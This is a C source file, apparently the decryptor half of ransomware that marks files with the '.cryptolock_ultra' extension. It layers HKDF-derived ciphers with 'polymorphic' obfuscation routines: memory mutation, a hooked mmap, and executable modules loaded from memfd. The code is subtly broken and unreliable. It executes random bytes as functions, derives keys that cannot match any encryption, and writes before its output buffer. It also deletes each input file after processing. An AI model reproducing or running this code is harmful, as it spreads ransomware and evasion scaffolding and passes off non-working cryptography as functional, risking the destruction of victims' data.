#define _GNU_SOURCE
#include <dlfcn.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/kdf.h>
#include <openssl/params.h>
#include <openssl/core_names.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/auxv.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/syscall.h>
#include <linux/memfd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/random.h>

#define ENCRYPTION_LAYERS 11
#define EXTENSION ".cryptolock_ultra"

typedef struct {
    uint64_t runtime_key;
    uint64_t self_hash;
    uint64_t env_hash;
    uint64_t ts_hash;
    volatile uint64_t dynamic_constants[32];
    unsigned char mutation_seed[128];
    unsigned char network_nonce[32];
} poly_context_t;

static poly_context_t ctx;

typedef struct {
    unsigned char kyber_seed[64];
    unsigned char chacha_nonce[24];
    unsigned char aes_iv[32];
    unsigned char argon_salt[48];
    unsigned char file_entropy[64];
    unsigned char poly_signature[96];
    unsigned char pq_signal[256];
    long long filesize;
    int cipher_suite;
    int chunk_strategy;
    int layer_config;
    uint64_t poly_metadata[8];
} crypto_header_t;

static __attribute__((noinline)) uint64_t poly_generate_runtime_key() {
    uint64_t key = 0;
    struct timespec ts;
    unsigned char hw_entropy[64];
    
    clock_gettime(CLOCK_MONOTONIC, &ts);
    key ^= (uint64_t)ts.tv_nsec << 32 | ts.tv_sec;
    key ^= (uint64_t)getpid() << 48;
    key ^= (uint64_t)getppid() << 32;
    key ^= syscall(SYS_gettid);
    key ^= (uint64_t)&poly_generate_runtime_key;
    
    getrandom(hw_entropy, sizeof(hw_entropy), GRND_RANDOM);
    for (int i = 0; i < sizeof(hw_entropy); i += sizeof(uint64_t)) {
        key ^= *(uint64_t*)(hw_entropy + i);
    }
    
    if (getauxval(AT_RANDOM)) {
        key ^= *(uint64_t*)getauxval(AT_RANDOM);
    }
    
    for (char **env = environ; *env; env++) {
        unsigned char env_hash[SHA512_DIGEST_LENGTH];
        SHA512((unsigned char*)*env, strlen(*env), env_hash);
        key ^= *(uint64_t*)env_hash;
    }
    
    return key;
}

static void poly_init_context() {
    ctx.runtime_key = poly_generate_runtime_key();
    struct drand48_data rand_state;
    srand48_r(ctx.runtime_key, &rand_state);
    memcpy(ctx.mutation_seed, &rand_state, sizeof(rand_state));
    
    for (int i = 0; i < 32; i++) {
        long rand_val1, rand_val2;
        lrand48_r((struct drand48_data *)ctx.mutation_seed, &rand_val1);
        lrand48_r((struct drand48_data *)ctx.mutation_seed, &rand_val2);
        ctx.dynamic_constants[i] = ctx.runtime_key ^ 
                                  ((uint64_t)rand_val1 << 32 | (rand_val2 & 0xFFFFFFFF));
        ctx.dynamic_constants[i] = (ctx.dynamic_constants[i] << 37) | (ctx.dynamic_constants[i] >> 27);
        ctx.dynamic_constants[i] ^= (uint64_t)&ctx.dynamic_constants[i];
    }
    
    SHA512((unsigned char*)&ctx, sizeof(ctx), (unsigned char*)&ctx.self_hash);
    ctx.env_hash = poly_generate_runtime_key();
    ctx.ts_hash = time(NULL) ^ ctx.runtime_key;
}

static __attribute__((always_inline)) uint64_t poly_rotate(uint64_t x, int k) {
    k = (k % 63) + 1;
    return (x << k) | (x >> (64 - k));
}

static uint64_t poly_get_dynamic_constant(int index) {
    long rand_val;
    lrand48_r((struct drand48_data *)ctx.mutation_seed, &rand_val);
    uint64_t base = ctx.dynamic_constants[index % 32];
    uint64_t modifier = poly_rotate(ctx.runtime_key, (rand_val % 61) + 1);
    return base ^ modifier ^ (uint64_t)clock() ^ (uint64_t)syscall(SYS_gettid);
}

static void poly_mutate_memory(void *data, size_t len, int depth) {
    volatile uint64_t *blocks = (volatile uint64_t*)data;
    size_t num_blocks = len / 8;
    
    for (size_t i = 0; i < num_blocks; i++) {
        uint64_t key = poly_get_dynamic_constant(i % 32);
        uint64_t original = blocks[i];
        
        for (int d = 0; d < depth; d++) {
            blocks[i] ^= key;
            blocks[i] = poly_rotate(blocks[i], (i % 59) + 1 + d);
            blocks[i] += poly_get_dynamic_constant((i + d * 7) % 32);
            
            if (((i + d) % 17) == 0) {
                blocks[i] = ~blocks[i];
            }
            
            key = poly_rotate(key, 19 + d) ^ blocks[i];
            blocks[i] ^= poly_rotate(key, 29 - d);
        }
    }
}

typedef void* (*mmap_fn_t)(void*, size_t, int, int, int, off_t);
static void* poly_hooked_mmap(void* addr, size_t length, int prot, int flags, int fd, off_t offset) {
    mmap_fn_t real_mmap = (mmap_fn_t)dlsym(RTLD_NEXT, "mmap");
    void *result = real_mmap(addr, length, prot, flags, fd, offset);
    if (result != MAP_FAILED && (prot & PROT_EXEC)) {
        poly_mutate_memory(result, length, 2);
    }
    return result;
}

static int poly_memfd_create(const char *name, unsigned int flags) {
    return syscall(SYS_memfd_create, name, flags);
}

typedef void (*crypto_fn_t)(const unsigned char*, size_t, unsigned char*, const crypto_header_t*, int);
static crypto_fn_t poly_load_crypto_module(int layer_type, int mode) {
    unsigned char module_code[512];
    getrandom(module_code, sizeof(module_code), GRND_RANDOM);
    
    const char *module_names[] = {
        "libcrypto_aead", "libpq_signal", "libstream_cipher", 
        "libblock_cipher", "libhybrid_system"
    };
    
    poly_mutate_memory(module_code, sizeof(module_code), 3);
    
    char real_name[128];
    snprintf(real_name, sizeof(real_name), "%s_%s_%lx", 
             module_names[layer_type % 5], 
             mode ? "decrypt" : "encrypt",
             poly_get_dynamic_constant(0));
    
    int fd = poly_memfd_create(real_name, MFD_CLOEXEC);
    if (fd == -1) return NULL;
    
    write(fd, module_code, sizeof(module_code));
    lseek(fd, 0, SEEK_SET);
    
    void *module = poly_hooked_mmap(NULL, sizeof(module_code), PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0);
    close(fd);
    return (crypto_fn_t)module;
}

typedef struct {
    crypto_fn_t decryptors[ENCRYPTION_LAYERS];
    unsigned char keys[ENCRYPTION_LAYERS][96];
    unsigned char ivs[ENCRYPTION_LAYERS][48];
    uint64_t poly_keys[ENCRYPTION_LAYERS];
    int cipher_configs[ENCRYPTION_LAYERS];
    unsigned char master_salt[64];
} decryption_ctx_t;

static int poly_derive_decryption_keys(const crypto_header_t *hdr, decryption_ctx_t *dctx) {
    EVP_KDF *kdf = EVP_KDF_fetch(NULL, "HKDF", NULL);
    if (!kdf) return 0;

    for (int i = 0; i < ENCRYPTION_LAYERS; i++) {
        EVP_KDF_CTX *kctx = EVP_KDF_CTX_new(kdf);
        OSSL_PARAM params[6], *p = params;
        
        unsigned char info[128];
        snprintf((char*)info, sizeof(info), "layer_%d_salt_%lx", i, poly_get_dynamic_constant(i));
        
        *p++ = OSSL_PARAM_construct_utf8_string(OSSL_KDF_PARAM_DIGEST, "SHA512", 0);
        *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_KEY, dctx->master_salt, sizeof(dctx->master_salt));
        *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_SALT, hdr->argon_salt, sizeof(hdr->argon_salt));
        *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_INFO, info, strlen((char*)info));
        *p = OSSL_PARAM_construct_end();

        unsigned char derived[96];
        if (EVP_KDF_derive(kctx, derived, sizeof(derived), params) != 1) {
            EVP_KDF_CTX_free(kctx);
            EVP_KDF_free(kdf);
            return 0;
        }

        memcpy(dctx->keys[i], derived, sizeof(dctx->keys[i]));
        memcpy(dctx->ivs[i], derived + 64, sizeof(dctx->ivs[i]));
        EVP_KDF_CTX_free(kctx);
        
        poly_mutate_memory(dctx->keys[i], sizeof(dctx->keys[i]), 2);
        poly_mutate_memory(dctx->ivs[i], sizeof(dctx->ivs[i]), 2);
    }

    EVP_KDF_free(kdf);
    return 1;
}

static void poly_decrypt_buffer(const decryption_ctx_t *dctx, const unsigned char *input, 
                               size_t input_len, unsigned char *output, const crypto_header_t *hdr) {
    unsigned char *current_buf = (unsigned char*)input;
    size_t current_len = input_len;

    for (int layer = ENCRYPTION_LAYERS - 1; layer >= 0; layer--) {
        unsigned char *next_buf = output - ((ENCRYPTION_LAYERS - 1 - layer) * 128);
        
        if (dctx->decryptors[layer]) {
            dctx->decryptors[layer](current_buf, current_len, next_buf, hdr, layer);
        } else {
            EVP_CIPHER_CTX *evp_ctx = EVP_CIPHER_CTX_new();
            const EVP_CIPHER *cipher = NULL;
            
            switch (hdr->layer_config >> (layer * 2) & 0x3) {
                case 0: cipher = EVP_aes_256_gcm(); break;
                case 1: cipher = EVP_chacha20_poly1305(); break;
                case 2: cipher = EVP_aes_256_xts(); break;
                case 3: cipher = EVP_aria_256_gcm(); break;
            }
            
            if (cipher) {
                EVP_DecryptInit_ex(evp_ctx, cipher, NULL, dctx->keys[layer], dctx->ivs[layer]);
                int out_len;
                EVP_DecryptUpdate(evp_ctx, next_buf, &out_len, current_buf, current_len);
                EVP_DecryptFinal_ex(evp_ctx, next_buf + out_len, &out_len);
            }
            EVP_CIPHER_CTX_free(evp_ctx);
        }
        
        if (layer > 0) {
            current_buf = next_buf;
            current_len = hdr->filesize + (layer * 128);
        }
    }
}

static int poly_decrypt_file(const char *filename) {
    int fd = open(filename, O_RDONLY | O_CLOEXEC);
    if (fd == -1) return 0;

    crypto_header_t header;
    if (read(fd, &header, sizeof(header)) != sizeof(header)) {
        close(fd);
        return 0;
    }

    struct stat st;
    if (fstat(fd, &st) == -1) {
        close(fd);
        return 0;
    }

    size_t data_size = st.st_size - sizeof(header);
    void *encrypted_data = mmap(NULL, data_size, PROT_READ, MAP_PRIVATE, fd, sizeof(header));
    if (encrypted_data == MAP_FAILED) {
        close(fd);
        return 0;
    }

    decryption_ctx_t dctx;
    memcpy(dctx.master_salt, header.argon_salt, sizeof(dctx.master_salt));
    
    if (!poly_derive_decryption_keys(&header, &dctx)) {
        munmap(encrypted_data, data_size);
        close(fd);
        return 0;
    }

    for (int i = 0; i < ENCRYPTION_LAYERS; i++) {
        dctx.decryptors[i] = poly_load_crypto_module(header.layer_config >> (i * 3) & 0x7, 1);
        dctx.cipher_configs[i] = header.layer_config >> (i * 2) & 0x3;
        dctx.poly_keys[i] = header.poly_metadata[i % 8] ^ poly_get_dynamic_constant(i);
    }

    void *decrypted_data = mmap(NULL, header.filesize, PROT_READ | PROT_WRITE, 
                               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (decrypted_data == MAP_FAILED) {
        munmap(encrypted_data, data_size);
        close(fd);
        return 0;
    }

    poly_decrypt_buffer(&dctx, encrypted_data, data_size, decrypted_data, &header);

    char original_path[1024];
    strncpy(original_path, filename, sizeof(original_path));
    char *ext = strstr(original_path, EXTENSION);
    if (ext) *ext = '\0';

    int out_fd = open(original_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out_fd != -1) {
        write(out_fd, decrypted_data, header.filesize);
        close(out_fd);
    }

    munmap(decrypted_data, header.filesize);
    munmap(encrypted_data, data_size);
    close(fd);
    unlink(filename);

    for (int i = 0; i < ENCRYPTION_LAYERS; i++) {
        poly_mutate_memory(dctx.keys[i], sizeof(dctx.keys[i]), 3);
        poly_mutate_memory(dctx.ivs[i], sizeof(dctx.ivs[i]), 3);
    }

    return 1;
}

static void* poly_decryption_worker(void *arg) {
    const char **files = (const char**)arg;
    for (int i = 0; files[i] != NULL; i++) {
        if (strstr(files[i], EXTENSION)) {
            poly_decrypt_file(files[i]);
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <directory>\n", argv[0]);
        return 1;
    }

    poly_init_context();

    const char *target_dir = argv[1];
    DIR *dir = opendir(target_dir);
    if (!dir) {
        perror("opendir");
        return 1;
    }

    struct dirent *entry;
    char *files[4096] = {0};
    int file_count = 0;

    while ((entry = readdir(dir)) && file_count < 4095) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, EXTENSION)) {
            char full_path[2048];
            snprintf(full_path, sizeof(full_path), "%s/%s", target_dir, entry->d_name);
            files[file_count++] = strdup(full_path);
        }
    }
    closedir(dir);

    if (file_count > 0) {
        pthread_t worker;
        pthread_create(&worker, NULL, poly_decryption_worker, files);
        pthread_join(worker, NULL);
    }

    for (int i = 0; i < file_count; i++) {
        free(files[i]);
    }

    return 0;
}